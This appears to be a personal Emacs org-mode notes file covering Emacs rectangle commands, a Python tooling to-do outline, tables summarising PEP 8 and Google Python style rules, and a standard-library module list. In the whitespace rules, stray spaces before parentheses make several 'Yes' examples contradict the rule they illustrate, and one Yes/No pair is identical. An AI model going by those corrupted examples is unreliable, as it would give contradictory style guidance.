      C-x r t	string-rectangle	矩形領域を文字列で置き換える
      C-x r k	kill-rectangle	矩形領域を削除してキルリングに追加
      C-x r y	yank-rectangle	キルリングの矩形領域を貼り付ける
      C-x r r	copy-rectangle-to-register	レジスターに矩形領域を登録する
      C-x r i	insert-register	レジスターに登録された矩形領域を貼り付ける

      リージョン選択中に C-<enter> で矩形選択モードになります。 sense-region と同様に C-w や M-w が使えます
      。また、矩形選択中に次のコマンドを打つと、矩形領域に対して操作を行うことができます。

      コマンド                                    動作
      適当なキー 矩形領域の前（または後ろ）にそのまま挿入。 <enter> で挿入位置を変えられる
      M-p        矩形の幅を固定
      M-b        空白文字で埋める。 open-rectangle と同等
      M-s        文字列で置き換える。 string-rectangle と同等
      M-f        1 種類の文字で埋める。 string-rectangle で 1 文字指定したときと同等
      M-i        矩形領域内の数字をインクリメントする
      M-n        矩形領域を連番で埋める。フォーマット指定可

***** command line
;;;; Command Option
(defun command-line-find-file-read-only (switch)
  (find-file-read-only (pop command-line-args-left)))

(add-to-list 'command-switch-alist
             '("--read-only" . command-line-find-file-read-only))

***** super character
      ?\a => 7                 ; control-g, `C-g'
      ?\b => 8                 ; backspace, <BS>, `C-h'
      ?\t => 9                 ; tab, <TAB>, `C-i'
      ?\n => 10                ; newline, `C-j'
      ?\v => 11                ; vertical tab, `C-k'
      ?\f => 12                ; formfeed character, `C-l'
      ?\r => 13                ; carriage return, <RET>, `C-m'
      ?\e => 27                ; escape character, <ESC>, `C-['
      ?\s => 32                ; space character, <SPC>
      ?\\ => 92                ; backslash character, `\'
      ?\d => 127               ; delete character, <DEL>

***** debug
      toggle-debug-on-quit

*** Python
**** Over view
***** [2/4] Build & Run
:実行して確認 変更させて動作させる:
****** DONE py-insert-debug-print
       CLOSED: [2013-02-27 03:32]
****** DONE py-delete-debug-print
       CLOSED: [2013-02-27 03:33]
****** TODO log を取る。
****** TODO 変数の変更があれば表示
***** [0/0] Specification
- Directory Constraction
- File Constraction
***** [0/0] History
- Changelog
- Readme
- mailing list
- news
- subversion
***** [0/0] Preprocessor
***** [2/4] minimap
******* TODO follow mode
******* TODO left view and imenu
******* DONE Microsoft Word
        CLOSED: [2013-02-27 03:38]
******* DONE Libre Office Writer
        CLOSED: [2013-02-27 03:39]
***** [0/0] Callgraph
- pycallgraph
- doxygen
****** UML
- pyreverse
  pyreverse.bat -o png package

***** [0/0] symbol list
- imenu
***** [0/0] Jump Function or Variable
***** [0/3] Document
****** TODO [1/2] 簡易表示
******* DONE arguments
        CLOSED: [2013-02-27 03:41]
******* TODO Summary

****** TODO [1/2] 詳細表示
******* DONE info
        CLOSED: [2013-02-27 03:41]
******* TODO source

****** TODO [0/2] Document History
******* TODO visited count
******* TODO memo



**** Edit Source
***** TODO Code Navigation
****** TODO Auto Completion
- jedi
****** TODO Function or Variable Name Assist
***** TODO Syntax Checker
***** Template
***** refactoring
**** Compile Build
**** Run
****** TODO Execute this buffer
**** Debug
***** TODO View Stack, locals/globals and return value
**** Profile
**** Coding style
(ref. [[http://www.python.org/dev/peps/pep-0008/][PEP 8 -- Style Guide for Python Code]])
(ref. [[http://google-styleguide.googlecode.com/svn/trunk/pyguide.html][Google Python Style Guide]])

***** Names to Avoid
- Never use the characters
  'l' (lowercase letter el),
  'O' (uppercase letter oh), or
  'I' (uppercase letter eye) as single character variable names.

- single character names except for counters or iterators
- dashes (-) in any package/module name
- __double_leading_and_trailing_underscore__ names (reserved by Python)

***** Naming Conventions

- "Internal" means internal to a module or protected or private within a class.
- Prepending a single underscore (_) has some support for protecting module variables
  and functions (not included with import * from).
  Prepending a double underscore (__) to an instance variable or method effectively
  serves to make the variable or method private to its class (using name mangling).
- Place related classes and top-level functions together in a module.
  Unlike Java, there is no need to limit yourself to one class per module.
- Use CapWords for class names, but lower_with_under.py for module names.
  Although there are many existing modules named CapWords.py,
  this is now discouraged because it's confusing when the module
  happens to be named after a class.
  ("wait -- did I write import StringIO or from StringIO import StringIO?")

|--------------------+--------------------------------------------------------------------------------|
| Entity             | Description                                                                    |
|--------------------+--------------------------------------------------------------------------------|
| package, module    | Public:   lower_with_under                                                     |
|                    | Internal: _lower_with_under                                                    |
|                    | Modules should have short, all-lowercase names.                                |
|                    | Underscores can be used in the module name if it improves readability.         |
|--------------------+--------------------------------------------------------------------------------|
| ClassName          | Public:   CapWords                                                             |
|                    | Internal: _CapWords                                                            |
|                    | Almost without exception,                                                      |
|                    | class names use the CapWords convention.                                       |
|                    | Classes for internal use have a leading underscore in addition.                |
|--------------------+--------------------------------------------------------------------------------|
| ExceptionNames     | Public:   CapWords                                                             |
| (ExceptionError)   | Because exceptions should be classes,                                          |
|                    | the class naming convention applies here.                                      |
|                    | However, you should use the suffix "Error" on your exception names             |
|                    | (if the exception actually is an error).                                       |
|--------------------+--------------------------------------------------------------------------------|
| G_GLOBAL_VARIABLE  | (Let's hope that these variables are meant for use inside one module only.)    |
|                    | The conventions are about the same as those for functions.                     |
|                    | Modules that are designed for use via from M import *                          |
|                    | should use the __all__ mechanism to prevent exporting globals,                 |
|                    | or use the older convention of prefixing such globals with an underscore       |
|                    | (which you might want to do to indicate these globals are                      |
|                    | "module non-public").                                                          |
|--------------------+--------------------------------------------------------------------------------|
| function_names     | Public:   lower_with_under ()                                                   |
|                    | Internal: _lower_with_under ()                                                  |
|                    | Function names should be lowercase,                                            |
|                    | with words separated by underscores as necessary to improve readability.       |
|                    | mixedCase is allowed only in contexts where that's already                     |
|                    | the prevailing style (e.g. threading.py), to retain backwards compatibility.   |
|--------------------+--------------------------------------------------------------------------------|
| function and       | Always use self for the first argument to instance methods.                    |
| method_arguments   | Always use cls for the first argument to class methods.                        |
|                    | If a function argument's name clashes with a reserved keyword,                 |
|                    | it is generally better to append a single trailing underscore                  |
|                    | rather than use an abbreviation or spelling corruption.                        |
|                    | Thus class_ is better than clss.                                               |
|                    | (Perhaps better is to avoid such clashes by using a synonym.)                  |
|--------------------+--------------------------------------------------------------------------------|
| method_name        | Public:   lower_with_under                                                     |
| and                | Internal: _lower_with_under                                                    |
| instance_variables | Use the function naming rules: lowercase with words separated                  |
| _non_public_meshod | by underscores as necessary to improve readability.                            |
|                    | Use one leading underscore only for non-public methods and instance variables. |
|                    | To avoid name clashes with subclasses, use two leading underscores             |
|                    | to invoke Python's name mangling rules.                                        |
|                    | Python mangles these names with the class name:                                |
|                    | if class Foo has an attribute named __a, it cannot be accessed by Foo.__a.     |
|                    | (An insistent user could still gain access by calling Foo._Foo__a.)            |
|                    | Generally, double leading underscores should be used only to avoid             |
|                    | name conflicts with attributes in classes designed to be subclassed.           |
|                    | Note: there is some controversy about the use of __names (see below).          |
|--------------------+--------------------------------------------------------------------------------|
| CONSTANT           | Public:   CAPS_WITH_UNDER                                                      |
|                    | Internal: _CAPS_WITH_UNDER                                                     |
|                    | Constants are usually defined on a module level and                            |
|                    | written in all capital letters with underscores separating words.              |
|                    | Examples include MAX_OVERFLOW and TOTAL.                                       |
|--------------------+--------------------------------------------------------------------------------|
| TypeName           |                                                                                |
| EnumeratedTypes    |                                                                                |

***** Rules
|--------------------+---------------------------------------------------------------------------------------------------|
| Line length        | Maximum line length is 80 characters. Do not use backslash line continuation.                     |
|                    | docstring or comments 72 characters.                                                                |
|--------------------+---------------------------------------------------------------------------------------------------|
| Indentation        | Indent your code blocks with 4 spaces. Never use tabs or mix tabs and spaces.                     |
|--------------------+---------------------------------------------------------------------------------------------------|
| Blank Lines        | Two blank lines between top-level definitions, one blank line between method definitions.         |
|                    | Two blank lines between top-level definitions, be they function or class definitions.             |
|                    | One blank line between method definitions and between the class line and the first method.        |
|                    | Use single blank lines as you judge appropriate within functions or methods.                      |
|--------------------+---------------------------------------------------------------------------------------------------|
| Semicolons         | Do not terminate your lines with semi-colons                                                      |
|                    | and do not use semi-colons to put two commands on the same line.                                  |
|--------------------+---------------------------------------------------------------------------------------------------|
| Whitespace         | Follow standard typographic rules for the use of spaces around punctuation.                       |
|                    | No whitespace inside parentheses, brackets or braces.                                             |
|                    | Yes: spam (ham[1], {eggs: 2}, [])                                                                  |
|                    | No:  spam ( ham[ 1 ], { eggs: 2 }, [ ] )                                                           |
|                    | ---                                                                                               |
|                    | No whitespace before a comma, semicolon, or colon.                                                |
|                    | Do use whitespace after a comma, semicolon, or colon except at the end of the line.               |
|                    | Yes: if x == 4:                                                                                   |
|                    | ........print x, y                                                                                |
|                    | ........x, y = y, x                                                                               |
|                    | No:  if x == 4 :                                                                                  |
|                    | ........print x , y                                                                               |
|                    | ........x , y = y , x                                                                             |
|                    | ---                                                                                               |
|                    | No whitespace before the open paren/bracket that                                                  |
|                    | starts an argument list, indexing or slicing.                                                     |
|                    | Yes: spam (1)                                                                                      |
|                    | No:  spam (1)                                                                                     |
|                    | Yes: dict['key'] = list[index]                                                                    |
|                    | No:  dict ['key'] = list [index]                                                                  |
|                    | ---                                                                                               |
|                    | Surround binary operators with a single space on either side for assignment (=),                   |
|                    | comparisons (==, <, >, !=, <>, <=, >=, in, not in, is, is not),                                   |
|                    | and Booleans (and, or, not).                                                                      |
|                    | Use your better judgment for the insertion of spaces around arithmetic operators                  |
|                    | but always be consistent about whitespace on either side of a binary operator.                    |
|                    | Yes: x == 1                                                                                       |
|                    | No:  x<1                                                                                          |
|                    | ---                                                                                               |
|                    | Don't use spaces around the '=' sign                                                              |
|                    | when used to indicate a keyword argument or a default parameter value.                            |
|                    | Yes: def complex (real, imag=0.0): return magic (r=real, i=imag)                                    |
|                    | No:  def complex (real, imag = 0.0): return magic (r = real, i = imag)                              |
|                    | ---                                                                                               |
|                    | Don't use spaces to vertically align tokens on consecutive lines,                                 |
|                    | since it becomes a maintenance burden (applies to :, #, =, etc.):                                 |
|                    |                                                                                                   |
|                    | Yes:                                                                                              |
|                    | foo = 1000  # comment                                                                             |
|                    | long_name = 2  # comment that should not be aligned                                               |
|                    |                                                                                                   |
|                    | dictionary = {                                                                                    |
|                    | ....'foo': 1,                                                                                     |
|                    | ....'long_name': 2,                                                                               |
|                    | }                                                                                                 |
|                    | No:                                                                                               |
|                    | foo       = 1000  # comment                                                                       |
|                    | long_name = 2     # comment that should not be aligned                                            |
|                    |                                                                                                   |
|                    | dictionary = {                                                                                    |
|                    | ....'foo'      : 1,                                                                               |
|                    | ....'long_name': 2,                                                                               |
|                    | }                                                                                                 |
|--------------------+---------------------------------------------------------------------------------------------------|
| shebang line       | Most .py files do not need to start with a #! line.                                               |
|                    | Start the main file of a program with #!/usr/bin/python.                                          |
|                    | This line is used by the kernel to find the Python interpreter,                                   |
|                    | but is ignored by Python when importing modules.                                                  |
|                    | It is only necessary on a file that will be executed directly.                                    |
|--------------------+---------------------------------------------------------------------------------------------------|
| strings            | Use the % operator for formatting strings, even when the parameters are all strings.              |
|                    | Use your best judgement to decide between + and % though.                                         |
|                    |                                                                                                   |
|                    | Yes: x = a + b                                                                                    |
|                    | .....x = '%s, %s!' % (imperative, expletive)                                                      |
|                    | .....x = 'name: %s; score: %d' % (name, n)                                                        |
|                    | No: x = '%s%s' % (a, b)  # use + in this case                                                     |
|                    | ....x = imperative + ', ' + expletive + '!'                                                       |
|                    | ....x = 'name: ' + name + '; score: ' + str (n)                                                    |
|                    |                                                                                                   |
|                    | Avoid using the + and += operators to accumulate a string within a loop.                          |
|                    | Since strings are immutable, this creates unnecessary temporary objects and                       |
|                    | results in quadratic rather than linear running time.                                             |
|                    | Instead, add each substring to a list and ''.join                                                 |
|                    | the list after the loop terminates (or, write each substring to a cStringIO.StringIO buffer).     |
|                    |                                                                                                   |
|                    | Yes: items = ['<table>']                                                                          |
|                    | .....for last_name, first_name in employee_list:                                                  |
|                    | .........items.append ('<tr><td>%s, %s</td></tr>' % (last_name, first_name))                       |
|                    | .....items.append ('</table>')                                                                     |
|                    | .....employee_table = ''.join (items)                                                              |
|                    | No: employee_table = '<table>'                                                                    |
|                    | ....for last_name, first_name in employee_list:                                                   |
|                    | ........employee_table += '<tr><td>%s, %s</td></tr>' % (last_name, first_name)                    |
|                    | ....employee_table += '</table>'                                                                  |
|                    |                                                                                                   |
|                    | Use """ for multi-line strings rather than '''. Note, however,                                    |
|                    | that it is often cleaner to use implicit line joining since multi-line                            |
|                    | strings do not flow with the indentation of the rest of the program:                              |
|                    |                                                                                                   |
|                    | Yes:                                                                                              |
|                    | ..print ("This is much nicer.\n"                                                                  |
|                    | ........."Do it this way.\n")                                                                     |
|                    | No:                                                                                               |
|                    | ..print """This is pretty ugly.                                                                   |
|                    | Don't do this.                                                                                    |
|--------------------+---------------------------------------------------------------------------------------------------|
| Files              | Explicitly close files and sockets when done with them.                                           |
| and                | Leaving files, sockets or other file-like objects open unnecessarily                              |
| Sockets            | has many downsides, including:                                                                    |
|                    |                                                                                                   |
|                    | They may consume limited system resources, such as file descriptors.                              |
|                    | Code that deals with many such objects may exhaust those resources unnecessarily                  |
|                    | if they're not returned to the system promptly after use.                                         |
|                    |                                                                                                   |
|                    | Holding files open may prevent other actions being performed on them,                             |
|                    | such as moves or deletion.                                                                        |
|                    | Files and sockets that are shared throughout a program may inadvertantly be                       |
|                    | read from or written to after logically being closed.                                             |
|                    | If they are actually closed, attempts to read or write from them will throw exceptions,           |
|                    | making the problem known sooner.                                                                  |
|                    |                                                                                                   |
|                    | Furthermore, while files and sockets are automatically closed when the file object is destructed, |
|                    | tying the life-time of the file object to the state of the file is poor practice,                 |
|                    | for several reasons:                                                                              |
|                    |                                                                                                   |
|                    | There are no guarantees as to when the runtime will actually run the file's destructor.           |
|                    | Different Python implementations use different memory management techniques,                      |
|                    | such as delayed Garbage Collection, which may increase the object's lifetime arbitrarily          |
|                    | and indefinitely.                                                                                 |
|                    |                                                                                                   |
|                    | Unexpected references to the file may keep it around longer than intended                         |
|                    | (e.g. in tracebacks of exceptions, inside globals, etc).                                          |
|                    |                                                                                                   |
|                    | The preferred way to manage files is using the "with" statement:                                  |
|                    |                                                                                                   |
|                    | with open ("hello.txt") as hello_file:                                                             |
|                    | ....for line in hello_file:                                                                       |
|                    | ........print line                                                                                |
|                    |                                                                                                   |
|                    | For file-like objects that do not support the "with" statement, use contextlib.closing ():         |
|                    |                                                                                                   |
|                    | import contextlib                                                                                 |
|                    |                                                                                                   |
|                    | with contextlib.closing (urllib.urlopen ("http://www.python.org/")) as front_page:                  |
|                    | ....for line in front_page:                                                                       |
|                    | ........print line                                                                                |
|                    |                                                                                                   |
|                    | Legacy AppEngine code using Python 2.5 may enable the "with" statement using                      |
|                    | "from __future__ import with_statement".                                                          |
|--------------------+---------------------------------------------------------------------------------------------------|
| TODO Comments      | Use TODO comments for code that is temporary,                                                     |
|                    | a short-term solution, or good-enough but not perfect.                                            |
|                    |                                                                                                   |
|                    | TODOs should include the string TODO in all caps,                                                 |
|                    | followed by the name, e-mail address, or other identifier                                         |
|                    | of the person who can best provide context about the problem                                      |
|                    | referenced by the TODO, in parentheses.                                                           |
|                    | A colon is optional.                                                                              |
|                    | A comment explaining what there is to do is required.                                             |
|                    | The main purpose is to have a consistent TODO format                                              |
|                    | that can be searched to find the person who can provide                                           |
|                    | more details upon request. A TODO is not a commitment that                                        |
|                    | the person referenced will fix the problem.                                                       |
|                    | Thus when you create a TODO, it is almost always your name that is given.                         |
|                    |                                                                                                   |
|                    | # TODO (kl@gmail.com): Use a "*" here for string repetition.                                       |
|                    | # TODO (Zeke) Change this to use relations.                                                        |
|                    |                                                                                                   |
|                    | If your TODO is of the form "At a future date do something"                                       |
|                    | make sure that you either include a very specific date                                            |
|                    | ("Fix by November 2009") or a very specific event                                                 |
|                    | ("Remove this code when all clients can handle XML responses.").                                  |
|--------------------+---------------------------------------------------------------------------------------------------|
| Imports formatting | Imports should be on separate lines.                                                              |
|                    |                                                                                                   |
|                    | E.g.:                                                                                             |
|                    |                                                                                                   |
|                    | Yes: import os                                                                                    |
|                    | _____import sys                                                                                   |
|                    | No:  import os, sys                                                                               |
|                    |                                                                                                   |
|                    | Imports are always put at the top of the file,                                                    |
|                    | just after any module comments and                                                                |
|                    | doc strings and before module globals and constants.                                              |
|                    | Imports should be grouped with                                                                    |
|                    | the order being most generic to least generic:                                                    |
|                    |                                                                                                   |
|                    | - standard library imports                                                                        |
|                    | - third-party imports                                                                             |
|                    | - application-specific imports                                                                    |
|                    |                                                                                                   |
|                    | Within each grouping, imports should be sorted lexicographically,                                 |
|                    | ignoring case, according to each module's full package path.                                      |
|                    |                                                                                                   |
|                    | import foo                                                                                        |
|                    | from foo import bar                                                                               |
|                    | from foo.bar import baz                                                                           |
|                    | from foo.bar import Quux                                                                          |
|                    | from Foob import ar                                                                               |
|--------------------+---------------------------------------------------------------------------------------------------|
| Statements         | Generally only one statement per line.                                                            |
|                    |                                                                                                   |
|                    | However, you may put the result of a test on the same line                                        |
|                    | as the test only if the entire statement fits on one line.                                        |
|                    | In particular, you can never do so with try/except                                                |
|                    | since the try and except can't both fit on the same line,                                         |
|                    | and you can only do so with an if if there is no else.                                            |
|                    |                                                                                                   |
|                    | Yes:                                                                                              |
|                    |                                                                                                   |
|                    | ..if foo: bar (foo)                                                                                |
|                    | No:                                                                                               |
|                    |                                                                                                   |
|                    | ..if foo: bar (foo)                                                                                |
|                    | ..else:   baz (foo)                                                                                |
|                    |                                                                                                   |
|                    | ..try:               bar (foo)                                                                     |
|                    | ..except ValueError: baz (foo)                                                                     |
|                    |                                                                                                   |
|                    | ..try:                                                                                            |
|                    | ......bar (foo)                                                                                    |
|                    | ..except ValueError: baz (foo)                                                                     |
|--------------------+---------------------------------------------------------------------------------------------------|
| Access Control     | If an accessor function would be trivial                                                          |
|                    | you should use public variables instead of accessor functions to avoid                            |
|                    | the extra cost of function calls in Python. When more functionality is                            |
|                    | added you can use property to keep the syntax consistent.                                         |
|                    |                                                                                                   |
|                    | On the other hand, if access is more complex,                                                     |
|                    | or the cost of accessing the variable is significant,                                             |
|                    | you should use function calls (following the Naming guidelines)                                   |
|                    | such as get_foo () and set_foo ().                                                                  |
|                    | If the past behavior allowed access through a property,                                           |
|                    | do not bind the new accessor functions to the property.                                           |
|                    | Any code still attempting to access the variable by the old method                                |
|                    | should break visibly so they are made aware of the change in complexity.                          |
|                    |                                                                                                   |
|                    |                                                                                                   |
|                    |                                                                                                   |
|                    |                                                                                                   |
|                    |                                                                                                   |
|                    |                                                                                                   |
|                    |                                                                                                   |
|                    |                                                                                                   |

***** Comments
|-----------------+--------------------------------------------------------------------------------------------|
| Comments        | Descriptions                                                                               |
|-----------------+--------------------------------------------------------------------------------------------|
| Doc Strings     | Python has a unique commenting style using doc strings.                                    |
|                 | A doc string is a string that is the first statement in a                                  |
|                 | package, module, class or function.                                                        |
|                 | These strings can be extracted automatically through the __doc__                           |
|                 | member of the object and are used by pydoc.                                                |
|                 | (Try running pydoc on your module to see how it looks.)                                    |
|                 | Our convention for doc strings is to use the three double-quote format for strings.        |
|                 | A doc string should be organized as a summary line (one physical line)                     |
|                 | terminated by a period, question mark, or exclamation point, followed by a blank line,     |
|                 | followed by the rest of the doc string starting at the same cursor position                |
|                 | as the first quote of the first line.                                                      |
|                 | There are more formatting guidelines for doc strings below.                                |
|-----------------+--------------------------------------------------------------------------------------------|
| Modules         | Every file should contain license boilerplate.                                             |
|                 | Choose the appropriate boilerplate for the license used by the project                     |
|                 | (for example, Apache 2.0, BSD, LGPL, GPL)                                                  |
|-----------------+--------------------------------------------------------------------------------------------|
| Functions       | As used in this section "function" applies to methods, function, and generators.           |
| and             | A function must have a docstring, unless it meets all of the following criteria:           |
| Methods         | - not externally visible                                                                   |
|                 | - very short                                                                               |
|                 | - obvious                                                                                  |
|                 |                                                                                            |
|                 | A docstring should give enough information to write a call to the function                 |
|                 | without reading the function's code.                                                       |
|                 | A docstring should describe the function's calling syntax                                  |
|                 | and its semantics, not its implementation.                                                 |
|                 | For tricky code, comments alongside the code are more appropriate than using docstrings.   |
|                 |                                                                                            |
|                 | Certain aspects of a function should be documented in special sections, listed below.      |
|                 | Each section begins with a heading line, which ends with a colon.                          |
|                 | Sections should be indented two spaces, except for the heading.                            |
|                 | Args:                                                                                      |
|                 | ......List each parameter by name.                                                         |
|                 | ......A description should follow the name, and be separated by a colon and a space.       |
|                 | ......If the description is too long to fit on a single 80-character line,                 |
|                 | ......use a hanging indent of 2 or 4 spaces (be consistent with the rest of the file).     |
|                 | ......The description should mention required type (s) and the meaning of the argument.     |
|                 |                                                                                            |
|                 | ......If a function accepts *foo (variable length argument lists)                          |
|                 | ......and/or **bar (arbitrary keyword arguments), they should be listed as *foo and **bar. |
|                 |                                                                                            |
|                 | Returns: (or Yields: for generators)                                                       |
|                 | ......Describe the type and semantics of the return value.                                 |
|                 | ......If the function only returns None, this section is not required.                     |
|                 |                                                                                            |
|                 | Raises:                                                                                    |
|                 | ......List all exceptions that are relevant to the interface.                              |
|                 |                                                                                            |
|                 | def fetch_bigtable_rows (big_table, keys, other_silly_variable=None):                       |
|                 | ...."""Fetches rows from a Bigtable.                                                       |
|                 |                                                                                            |
|                 | ....Retrieves rows pertaining to the given keys from the Table instance                    |
|                 | ....represented by big_table.  Silly things may happen if                                  |
|                 | ....other_silly_variable is not None.                                                      |
|                 | ....Args:                                                                                  |
|                 | ......big_table: An open Bigtable Table instance.                                          |
|                 | ......keys: A sequence of strings representing the key of each table row                   |
|                 | ......to fetch.                                                                            |
|                 | ......other_silly_variable: Another optional variable, that has a much                     |
|                 | ......longer name than the other args, and which does nothing.                             |
|                 |                                                                                            |
|                 | ....Returns:                                                                               |
|                 | ......A dict mapping keys to the corresponding table row data                              |
|                 | ......fetched. Each row is represented as a tuple of strings. For                          |
|                 | ......example:                                                                             |
|                 |                                                                                            |
|                 | ......{'Serak': ('Rigel VII', 'Preparer'),                                                 |
|                 | ......'Zim': ('Irk', 'Invader'),                                                           |
|                 | ......'Lrrr': ('Omicron Persei 8', 'Emperor')}                                             |
|                 | ....                                                                                       |
|                 | ......If a key from the keys argument is missing from the dictionary,                      |
|                 | ......then that row was not found in the table.                                            |
|                 |                                                                                            |
|                 | ....Raises:                                                                                |
|                 | ......IOError: An error occurred accessing the bigtable.Table object.                      |
|                 | ...."""                                                                                    |
|                 | ....pass                                                                                   |
|-----------------+--------------------------------------------------------------------------------------------|
| Classes         | Classes should have a doc string below the class definition describing the class.          |
|                 |                                                                                            |
|                 | If your class has public attributes, they should be documented here in an Attributes       |
|                 | section and follow the same formatting as a function's Args section.                       |
|                 |                                                                                            |
|                 | class SampleClass (object):                                                                 |
|                 | ...."""Summary of class here.                                                              |
|                 |                                                                                            |
|                 | ....Longer class information....                                                           |
|                 | ....Longer class information....                                                           |
|                 |                                                                                            |
|                 | ....Attributes:                                                                            |
|                 | ........likes_spam: A boolean indicating if we like SPAM or not.                           |
|                 | ........eggs: An integer count of the eggs we have laid.                                   |
|                 | ...."""                                                                                    |
|                 |                                                                                            |
|                 | ....def __init__(self, likes_spam=False):                                                  |
|                 | ........"""Inits SampleClass with blah."""                                                 |
|                 | ........self.likes_spam = likes_spam                                                       |
|                 | ........self.eggs = 0                                                                      |
|                 |                                                                                            |
|                 | ....def public_method (self):                                                               |
|                 | ........"""Performs operation blah."""                                                     |
|-----------------+--------------------------------------------------------------------------------------------|
| Block           | The final place to have comments is in tricky parts of the code.                           |
| and             | If you're going to have to explain it at the next code review,                             |
| Inline Comments | you should comment it now. Complicated operations get a few lines                          |
|                 | of comments before the operations commence.                                                |
|                 |                                                                                            |
|                 | # We use a weighted dictionary search to find out where i is in                            |
|                 | # the array.  We extrapolate position based on the largest num                             |
|                 | # in the array and the array size and then do binary search to                             |
|                 | # get the exact number.                                                                    |
|                 |                                                                                            |
|                 | if i & (i-1) == 0:        # true iff i is a power of 2                                     |
|                 |                                                                                            |
|                 | To improve legibility, these comments should be at least 2 spaces away from the code.      |
|                 |                                                                                            |
|                 | On the other hand, never describe the code.                                                |
|                 | Assume the person reading the code knows Python                                            |
|                 | (though not what you're trying to do) better than you do.                                  |
|                 |                                                                                            |
|                 | # BAD COMMENT: Now go through the b array and make sure whenever i occurs                  |
|                 | # the next element is i+1                                                                  |
|-----------------+--------------------------------------------------------------------------------------------|
| Classes         | If a class inherits from no other base classes, explicitly inherit from object.            |
|                 | This also applies to nested classes.                                                       |
|                 |                                                                                            |
|                 | Yes: class SampleClass (object):                                                            |
|                 | ........pass                                                                               |
|                 |                                                                                            |
|                 |                                                                                            |
|                 | .....class OuterClass (object):                                                             |
|                 |                                                                                            |
|                 | ........class InnerClass (object):                                                          |
|                 | .............pass                                                                          |
|                 |                                                                                            |
|                 |                                                                                            |
|                 | .....class ChildClass (ParentClass):                                                        |
|                 | ........"""Explicitly inherits from another class already."""                              |
|                 |                                                                                            |
|                 | No: class SampleClass:                                                                     |
|                 | ........pass                                                                               |
|                 |                                                                                            |
|                 |                                                                                            |
|                 | ....class OuterClass:                                                                      |
|                 |                                                                                            |
|                 | ........class InnerClass:                                                                  |
|                 | ............pass                                                                           |
|                 |                                                                                            |
|                 |                                                                                            |
|                 | Inheriting from object is needed to make properties work properly,                                                                                                     |
|                 | and it will protect your code from one particular potential incompatibility                                                                                            |
|                 | with Python 3000. It also defines special methods that implement the default                                                                                           |
|                 | semantics of objects including                                                                                                                                         |
|                 | __new__, __init__, __delattr__, __getattribute__, __setattr__,                                                                                                         |
|                 | __hash__, __repr__, and __str__.                                                                                                                                       |
|-----------------+--------------------------------------------------------------------------------------------|

**** Outline
**** Interpreter
**** tmp
***** Operaters
- lt <
- le <=
- eq =
- ne <>
- ge >=
- gt >

***** Standard Library
****** Text
1 string                -Text Constants and Templates
2 textwrap              -Formatting Text Paragraphs
3 re                    -Regular Expressions
4 difflib               -Compare Sequences

****** Data Structures
1 collections           -Container Data Types
2 array                 -Sequence of Fixed-Type Data
3 heapq                 -Heap Sort Algorithm
4 bisect                -Maintain Lists in Sorted Order
5 Queue                 -Thread-Safe FIFO Implementation
6 struct                -Binary Data Structures
7 weakref               -Impermanent References to Objects
8 copy                  -Duplicate Objects
9 pprint                -Pretty-Print Data Structures

****** Algorithms
1 functools             -Tools for Manipulating Functions
2 itertools             -Iterator Functions
3 operator              -Functional Interface to Built-in Operators
4 contextlib            -Context Manager Utilities

****** Dates and Times
1 time                  -Clock Time
2 datetime              -Date and Time Value Manipulation
3 calendar              -Work with Dates

****** Mathematics
1 decimal               -Fixed and Floating-Point Math
2 fractions             -Rational Numbers
3 random                -Pseudorandom Number Generators
4 math                  -Mathematical Functions

****** The File System
1 os.path               -Platform-Independent Manipulation of Filenames
2 glob                  -Filename Pattern Matching
3 linecache             -Read Text Files Efficiently
4 tempfile              -Temporary File System Objects
5 shutil                -High-Level File Operations
6 mmap                  -Memory-Map Files
7 codecs                -String Encoding and Decoding
8 StringIO              -Text Buffers with a File-like API
9 fnmatch               -UNIX-Style Glob Pattern Matching
10 dircache             -Cache Directory Listings
11 filecmp              -Compare Files

****** Data Persistence and Exchange
1 pickle                -Object Serialization
2 shelve                -Persistent Storage of Objects
3 anydbm                -DBM-Style Databases
4 whichdb               -Identify DBM-Style Database Formats
5 sqlite3               -Embedded Relational Database
6 xml.etree.ElementTree -XML Manipulation API
7 csv                   -Comma-Separated Value Files

****** Data Compression and Archiving
1 zlib                  -GNU zlib Compression
2 gzip                  -Read and Write GNU Zip Files
3 bz2                   -bzip2 Compression
4 tarfile               -Tar Archive Access
5 zipfile               -ZIP Archive Access

****** Cryptography
1 hashlib               -Cryptographic Hashing
2 hmac                  -Cryptographic Message Signing and Verification

****** Processes and Threads
1 subprocess            -Spawning Additional Processes
2 signal                -Asynchronous System Events
3 threading             -Manage Concurrent Operations
4 multiprocessing       -Manage Processes like Threads

****** Networking
1 socket                -Network Communication
2 select                -Wait for I/O Efficiently
3 SocketServer          -Creating Network Servers
4 asyncore              -Asynchronous I/O
5 asynchat              -Asynchronous Protocol Handler

****** The Internet
1 urlparse              -Split URLs into Components
2 BaseHTTPServer        -Base Classes for Implementing Web Servers
3 urllib                -Network Resource Access
4 urllib2               -Network Resource Access
5 base64                -Encode Binary Data with ASCII
6 robotparser           -Internet Spider Access Control
7 Cookie                -HTTP Cookies
8 uuid                  -Universally Unique Identifiers
9 json                  -JavaScript Object Notation
10 xmlrpclib            -Client Library for XML-RPC
11 SimpleXMLRPCServer   -An XML-RPC Server

****** Email
1 smtplib               -Simple Mail Transfer Protocol Client
2 smtpd                 -Sample Mail Servers
3 imaplib               -IMAP4 Client Library
4 mailbox               -Manipulate Email Archives

****** Application Building Blocks
1 getopt                -Command-Line Option Parsing
2 optparse              -Command-Line Option Parser
3 argparse              -Command-Line Option and Argument Parsing
4 readline              -The GNU Readline Library
5 getpass               -Secure Password Prompt
6 cmd                   -Line-Oriented Command Processors
7 shlex                 -Parse Shell-Style Syntaxes
8 ConfigParser          -Work with Configuration Files
9 logging               -Report Status, Error, and Informational Messages
10 fileinput            -Command-Line Filter Framework
11 atexit               -Program Shutdown Callbacks
12 sched                -Timed Event Scheduler

****** Internationalization and Localization
1 gettext               -Message Catalogs
2 locale                -Cultural Localization API

****** Developer Tools
1 pydoc                 -Online Help for Modules
2 doctest               -Testing through Documentation
3 unittest              -Automated Testing Framework
4 traceback             -Exceptions and Stack Traces
5 cgitb                 -Detailed Traceback Reports
6 pdb                   -Interactive Debugger
7 trace                 -Follow Program Flow
8 profile and pstats    -Performance Analysis
9 timeit                -Time the Execution of Small Bits of Python Code
10 compileall           -Byte-Compile Source Files
11 pyclbr               -Class Browser

****** Runtime Features
1 site                  -Site-Wide Configuration
2 sys                   -System-Specific Configuration
3 os                    -Portable Access to Operating System Specific Features
4 platform              -System Version Information
5 resource              -System Resource Management
6 gc                    -Garbage Collector
7 sysconfig             -Interpreter Compile-Time Configuration

****** Language Tools
